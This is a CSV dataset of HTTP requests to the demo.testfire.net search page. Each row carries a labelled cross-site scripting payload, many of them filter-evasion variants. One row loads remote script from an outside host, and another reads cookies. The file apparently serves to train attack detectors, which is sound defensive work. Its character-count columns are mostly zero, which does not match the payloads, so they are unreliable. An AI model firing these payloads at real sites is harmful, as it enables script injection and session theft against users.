method,path,headers,body,body_length,num_commas,num_hyphens,num_brackets,num_quotes,num_double_quotes,num_slashes,num_braces,num_spaces,has_sql_keywords,has_xss_payload,has_csrf_token,response_status,response_time,nature
GET,http://demo.testfire.net/search.jsp?query=</textarea><br><code onmouseover=a=eval;b=alert;a(b(/g/.source));>MOVE MOUSE OVER THIS AREA</code>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,303,xss
GET,"http://demo.testfire.net/search.jsp?query='';!--""<XSS>=&{()}","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,304,xss
GET,http://demo.testfire.net/search.jsp?query=<IMG SRC=javascript:alert('XSS')>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,308,xss
GET,http://demo.testfire.net/search.jsp?query=<IMG SRC=JaVaScRiPt:alert('XSS')>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,306,xss
GET,"http://demo.testfire.net/search.jsp?query=<IMG SRC=`javascript:alert(""XSS says, 'XSS'"")`>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,310,xss
GET,"http://demo.testfire.net/search.jsp?query=<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">"",","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,298,xss
GET,"http://demo.testfire.net/search.jsp?query=<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,271,xss
GET,http://demo.testfire.net/search.jsp?query=<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,273,xss
GET,http://demo.testfire.net/search.jsp?query=<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,271,xss
GET,"http://demo.testfire.net/search.jsp?query=<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,339,xss
GET,"http://demo.testfire.net/search.jsp?query=<IMG SRC=""jav&#x09;ascript:alert(<WBR>'XSS');"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,331,xss
GET,"http://demo.testfire.net/search.jsp?query=<IMG SRC=""jav&#x0A;ascript:alert(<WBR>'XSS');"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,330,xss
GET,http://demo.testfire.net/search.jsp?query=<img src=`x` onrerror= ` ;; alert(1) ` />,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,616,xss
GET,"http://demo.testfire.net/search.jsp?query=</a style=""""xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,307,xss
GET,"http://demo.testfire.net/search.jsp?query=style=color: expression(alert(0));"" a=""","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,305,xss
GET,http://demo.testfire.net/search.jsp?query=vbscript:Execute(MsgBox(chr(88)&chr(83)&chr(83)))<,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,305,xss
GET,http://demo.testfire.net/search.jsp?query=width: expression((window.r==document.cookie)?'':alert(r=document.cookie)),"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,308,xss
GET,http://demo.testfire.net/search.jsp?query=<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,306,xss
GET,"http://demo.testfire.net/search.jsp?query=<DIV STYLE=""width: expression(alert('XSS'));"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,305,xss
GET,"http://demo.testfire.net/search.jsp?query=<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,305,xss
GET,"http://demo.testfire.net/search.jsp?query=<IMG SRC=""javascript:alert('XSS');"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,318,xss
GET,"http://demo.testfire.net/search.jsp?query=<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,302,xss
GET,"http://demo.testfire.net/search.jsp?query=<IMG SRC=`javascript:alert(""RSnake says### 'XSS'"")`>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,316,xss
GET,"http://demo.testfire.net/search.jsp?query=<IMG SRC=""javascript:alert('XSS')""","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,305,xss
GET,http://demo.testfire.net/search.jsp?query=<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,290,xss
GET,http://demo.testfire.net/search.jsp?query=<IMG SRC=javascript:alert(&quot;XSS&quot;)>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,280,xss
GET,"http://demo.testfire.net/search.jsp?query=<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,279,xss
GET,http://demo.testfire.net/search.jsp?query=<IMG SRC=javascript:alert(String.fromCharCode(88###83###83))>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,311,xss
GET,"http://demo.testfire.net/search.jsp?query=<IMG DYNSRC=""javascript:alert('XSS');"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,309,xss
GET,"http://demo.testfire.net/search.jsp?query=<IMG LOWSRC=""javascript:alert('XSS');"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,306,xss
GET,http://demo.testfire.net/search.jsp?query=<IMG SRC=javascript:alert('XSS')>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,302,xss
GET,"http://demo.testfire.net/search.jsp?query=exp/*<XSS STYLE='no\xss:noxss(""*//*"");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(""XSS""))'>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,306,xss
GET,"http://demo.testfire.net/search.jsp?query=<IMG SRC=""javascript:alert('XSS');"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,301,xss
